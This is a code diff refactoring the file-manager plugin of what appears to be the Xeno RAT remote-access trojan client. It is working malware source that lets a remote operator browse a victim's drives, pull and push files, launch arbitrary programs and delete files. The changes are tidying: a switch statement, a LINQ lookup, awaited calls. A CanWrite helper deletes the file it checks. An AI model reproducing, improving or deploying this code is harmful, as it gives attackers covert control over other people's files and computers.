@@ -1,14 +1,7 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Net.Sockets;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
-using xeno_rat_client;
-
 
 namespace Plugin
 {
@@ -16,7 +9,7 @@ namespace Plugin
     {
         public async Task Run(Node node)
         {
-            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
+            await node.SendAsync(new byte[] { 3 }); // Indicate that it has connected
 
             while (node.Connected())
             {
@@ -26,23 +19,17 @@ namespace Plugin
                     if (id != null)
                     {
                         int nodeid = node.sock.BytesToInt(id);
-                        Node tempnode = null;
-                        foreach (Node i in node.Parent.subNodes)
+                        Node tempnode = node.Parent.subNodes.Find(i => i.SetId == nodeid);
+                        if (tempnode != null)
                         {
-                            if (i.SetId == nodeid)
-                            {
-                                await node.SendAsync(new byte[] { 1 });
-                                tempnode = i;
-                                break;
-                            }
+                            await node.SendAsync(new byte[] { 1 });
+                            node.AddSubNode(tempnode);
+                            await FileManagerHandler(tempnode);
                         }
-                        if (tempnode == null)
+                        else
                         {
                             await node.SendAsync(new byte[] { 0 });
-                            continue;
                         }
-                        node.AddSubNode(tempnode);
-                        FileManagerHandler(tempnode);
                     }
                     else
                     {
@@ -55,41 +42,40 @@ namespace Plugin
                 }
             }
             node.Disconnect();
-
-
         }
+
         private async Task FileManagerHandler(Node node)
         {
             byte[] typedata = await node.ReceiveAsync();
             if (typedata == null)
             {
                 node.Disconnect();
+                return;
             }
             int type = typedata[0];
-            if (type == 0)
+            switch (type)
             {
-                await FileViewer(node);
-            }
-            else if (type == 1)
-            {
-                await FileUploader(node);
-                //file download
-            }
-            else if (type == 2)
-            {
-                await FileDownloader(node);
-                //file upload
-            }
-            else if (type == 3)
-            {
-                await StartFile(node);
-            }
-            else if (type == 4)
-            {
-                await DeleteFile(node);
+                case 0:
+                    await FileViewer(node);
+                    break;
+                case 1:
+                    await FileUploader(node);
+                    break;
+                case 2:
+                    await FileDownloader(node);
+                    break;
+                case 3:
+                    await StartFile(node);
+                    break;
+                case 4:
+                    await DeleteFile(node);
+                    break;
+                default:
+                    break;
             }
             GC.Collect();
         }
+
         private async Task DeleteFile(Node node)
         {
             byte[] success = new byte[] { 1 };
@@ -111,6 +97,7 @@ namespace Plugin
                 await node.SendAsync(fail);
             }
         }
+
         private async Task StartFile(Node node)
         {
             byte[] success = new byte[] { 1 };
@@ -124,15 +111,16 @@ namespace Plugin
             string path = Encoding.UTF8.GetString(data);
             try
             {
-                Process.Start(path);
+                System.Diagnostics.Process.Start(path);
                 await node.SendAsync(success);
             }
-            catch 
+            catch
             {
                 await node.SendAsync(fail);
             }
         }
-        private async Task<bool> CanRead(string path) 
+
+        private async Task<bool> CanRead(string path)
         {
             try
             {
@@ -143,12 +131,12 @@ namespace Plugin
                 }
                 return true;
             }
-            catch 
-            { 
-                
+            catch
+            {
+                return false;
             }
-            return false;
         }
+
         public bool CanWrite(string path)
         {
             if (string.IsNullOrEmpty(path))
@@ -156,51 +144,28 @@ namespace Plugin
                 return false;
             }
 
-            if (File.Exists(path))
+            try
             {
-                try
+                using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Write))
                 {
-                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Write))
-                    {
-                        // Successfully opened the file with write access
-                        fileStream.Close();
-                    }
-                }
-                catch
-                {
-                    return false;
-                }
-
-                try
-                {
-                    // Delete the file if it exists and write access was confirmed
-                    File.Delete(path);
-                }
-                catch
-                {
-                    return false;
+                    fileStream.Close();
                 }
             }
-            else if (Directory.Exists(Path.GetDirectoryName(path)))
+            catch
             {
-                string tempFilePath = Path.Combine(Path.GetDirectoryName(path), Guid.NewGuid().ToString());
-                try
-                {
-                    using (FileStream fileStream = new FileStream(tempFilePath, FileMode.CreateNew, FileAccess.Write))
-                    {
-                        // Successfully created the file, so you can write to the directory
-                        fileStream.Close();
-                    }
-                    File.Delete(tempFilePath);
-                }
-                catch 
-                {
-                    return false;
-                }
-                return true;
+                return false;
             }
 
-            return false;
+            try
+            {
+                File.Delete(path);
+            }
+            catch
+            {
+                return false;
+            }
+
+            return true;
         }
 
         private async Task FileDownloader(Node node)
@@ -247,18 +212,19 @@ namespace Plugin
             await Task.Delay(500);
             node.Disconnect();
         }
+
         private async Task FileUploader(Node node)
         {
             byte[] success = new byte[] { 1 };
             byte[] fail = new byte[] { 0 };
-            byte[] data=await node.ReceiveAsync();
-            if (data == null) 
+            byte[] data = await node.ReceiveAsync();
+            if (data == null)
             {
                 node.Disconnect();
                 return;
             }
-            string path=Encoding.UTF8.GetString(data);
-            if (!await CanRead(path)) 
+            string path = Encoding.UTF8.GetString(data);
+            if (!await CanRead(path))
             {
                 await node.SendAsync(fail);
                 node.Disconnect();
@@ -282,34 +248,35 @@ namespace Plugin
             await Task.Delay(500);
             node.Disconnect();
         }
-        private async Task FileViewer(Node node) 
+
+        private async Task FileViewer(Node node)
         {
             byte[] success = new byte[] { 1 };
             byte[] fail = new byte[] { 0 };
-            while (node.Connected()) 
+            while (node.Connected())
             {
-                byte[] data=await node.ReceiveAsync();
-                if (data == null) 
+                byte[] data = await node.ReceiveAsync();
+                if (data == null)
                 {
                     break;
                 }
-                string path=Encoding.UTF8.GetString(data);
-                try 
+                string path = Encoding.UTF8.GetString(data);
+                try
                 {
                     string[] Directories = { };
                     string[] Files = { };
-                    if (path == "")
+                    if (string.IsNullOrEmpty(path))
                     {
                         Directories = System.IO.Directory.GetLogicalDrives();
                     }
-                    else 
+                    else
                     {
                         Directories = Directory.GetDirectories(path);
-                        Files=Directory.GetFiles(path);
+                        Files = Directory.GetFiles(path);
                     }
                     await node.SendAsync(success);
                     await node.SendAsync(node.sock.IntToBytes(Directories.Length));
-                    foreach (string i in Directories) 
+                    foreach (string i in Directories)
                     {
                         await node.SendAsync(Encoding.UTF8.GetBytes(i));
                     }
@@ -319,38 +286,37 @@ namespace Plugin
                         await node.SendAsync(Encoding.UTF8.GetBytes(i));
                     }
                 }
-                catch 
+                catch
                 {
                     await node.SendAsync(fail);
                 }
-                //if path is empty use string[] drives = System.IO.Directory.GetLogicalDrives(); . return all the drives
-                //use path to get files and such
             }
             node.Disconnect();
         }
+
         public long BytesToLong(byte[] data, int offset = 0)
         {
             if (BitConverter.IsLittleEndian)
             {
                 return (long)data[offset] |
-                       (long)data[offset + 1] << 8 |
-                       (long)data[offset + 2] << 16 |
-                       (long)data[offset + 3] << 24 |
-                       (long)data[offset + 4] << 32 |
-                       (long)data[offset + 5] << 40 |
-                       (long)data[offset + 6] << 48 |
-                       (long)data[offset + 7] << 56;
+                    (long)data[offset + 1] << 8 |
+                    (long)data[offset + 2] << 16 |
+                    (long)data[offset + 3] << 24 |
+                    (long)data[offset + 4] << 32 |
+                    (long)data[offset + 5] << 40 |
+                    (long)data[offset + 6] << 48 |
+                    (long)data[offset + 7] << 56;
             }
             else
             {
                 return (long)data[offset + 7] |
-                       (long)data[offset + 6] << 8 |
-                       (long)data[offset + 5] << 16 |
-                       (long)data[offset + 4] << 24 |
-                       (long)data[offset + 3] << 32 |
-                       (long)data[offset + 2] << 40 |
-                       (long)data[offset + 1] << 48 |
-                       (long)data[offset] << 56;
+                    (long)data[offset + 6] << 8 |
+                    (long)data[offset + 5] << 16 |
+                    (long)data[offset + 4] << 24 |
+                    (long)data[offset + 3] << 32 |
+                    (long)data[offset + 2] << 40 |
+                    (long)data[offset + 1] << 48 |
+                    (long)data[offset] << 56;
             }
         }
 
